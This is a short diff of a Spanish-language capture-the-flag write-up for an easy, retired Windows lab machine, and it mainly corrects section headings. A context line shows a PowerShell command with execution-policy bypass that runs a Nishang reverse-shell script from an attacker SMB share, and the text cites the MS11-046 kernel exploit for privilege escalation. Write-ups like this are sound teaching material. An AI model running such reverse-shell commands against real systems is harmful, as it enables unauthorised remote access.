@@ -6,7 +6,7 @@
 1. [Overview](#id1)
 2. [Enumeración](#id2)
 3. [Explotación](#id3)
-4. [Priviledge Escalation](#id4)
+4. [Escalada de Privilegios](#id4)
 
 #
 ## 1. Overview<a name="id1"></a>
@@ -16,7 +16,7 @@
 |Windows|Easy|Retired|FTP-Web|Kernel|
 
 #
-## 2. Enumeracion<a name="id1"></a>
+## 2. Enumeración<a name="id1"></a>
 
 ### 2.1 Nmap
 
@@ -100,7 +100,7 @@ powershell -ExecutionPolicy Bypass \\10.10.14.20\SHELL\Invoke-PowerShellTcp.ps1
 ![](./images/nishang.png)
 
 #
-## 4. Priviledge Escalateion<a name="id4"></a>
+## 4. Escalada de Privilegios<a name="id4"></a>
 
 ### 4.1 CVE-2011-1249 - MS11-046
 
